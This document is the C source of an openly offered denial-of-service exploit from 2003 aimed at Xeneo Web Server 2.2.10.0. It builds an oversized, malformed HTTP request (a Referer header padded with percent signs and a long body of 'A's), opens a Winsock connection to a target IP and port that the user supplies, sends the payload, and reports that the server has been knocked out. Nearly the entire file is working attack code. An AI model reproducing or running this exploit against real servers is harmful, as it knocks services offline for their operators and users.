/* Xeneo Web Server 2.2.2.10.0 DoS 
 *
 * Vulnerable systems:
 * Xeneo Web Server 2.2.10.0
 * Vendor:
 * http://www.northernsolutions.com
 *
 * Written and found by badpack3t <badpack3t@security-protocols.com>
 * For SP Research Labs
 * 04/23/2003
 * 
 * www.security-protocols.com
 *
 * usage: 
 * sp-xeneo2 <targetip> [targetport] (default is 80)
 *
 * big ups 2: 
 * c0nnie, ^Foster, ac1djazz, mp, regulate, stripey, dvdman, hex_, inet
 */

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char exploit[] = 

"GET /index.html?testvariable=&nexttestvariable=gif HTTP/1.1\r\n"
"Referer: http://localhost/%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\r\n"
"Content-Type: application/x-www-form-urlencoded\r\n"
"Connection: Keep-Alive\r\n"
"Cookie: VARIABLE=SPLABS; path=/\r\n"
"User-Agent: Mozilla/4.76 [en] (X11; U; Linux 2.4.2-2 i686)\r\n"
"Variable: result\r\n"
"Host: localhost\r\n"
"Content-length:     513\r\n"
"Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png\r\n"
"Accept-Encoding: gzip\r\n"
"Accept-Language: en\r\n"
"Accept-Charset: iso-8859-1,*,utf-8\r\n\r\n\r\n"
"whatyoutyped=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n";

int main(int argc, char *argv[])
{
	WSADATA wsaData;
	WORD wVersionRequested;
	struct hostent 		*pTarget;
	struct sockaddr_in 	sock;
	char *target, buffer[30000];
	int port,bufsize;
	SOCKET mysocket;
	
	if (argc < 2)
	{
		printf("Xeneo Web Server 2.2.10.0 DoS\r\n <badpack3t@security-protocols.com>\r\n\r\n", argv[0]);
		printf("Tool Usage:\r\n %s <targetip> [targetport] (default is 80)\r\n\r\n", argv[0]);
		printf("www.security-protocols.com\r\n\r\n", argv[0]);
		exit(1);
	}

	wVersionRequested = MAKEWORD(1, 1);
	if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

	target = argv[1];

	//for default web attacks
	port = 80;

	if (argc >= 3) port = atoi(argv[2]);
	bufsize = 512;
	if (argc >= 4) bufsize = atoi(argv[3]);

	mysocket = socket(AF_INET, SOCK_STREAM, 0);
	if(mysocket==INVALID_SOCKET)
	{	
		printf("Socket error!\r\n");
		exit(1);
	}

	printf("Resolving Hostnames...\n");
	if ((pTarget = gethostbyname(target)) == NULL)
	{
		printf("Resolve of %s failed\n", argv[1]);
		exit(1);
	}

	memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons((USHORT)port);

	printf("Connecting...\n");
	if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
	{
		printf("Couldn't connect to host.\n");
		exit(1);
	}

	printf("Connected!...\n");
	printf("Sending Payload...\n");
	if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
	{
		printf("Error Sending the Exploit Payload\r\n");
		closesocket(mysocket);
		exit(1);
	}

	printf("Remote Webserver has been DoS'ed \r\n");
	closesocket(mysocket);
	WSACleanup();
	return 0;
}

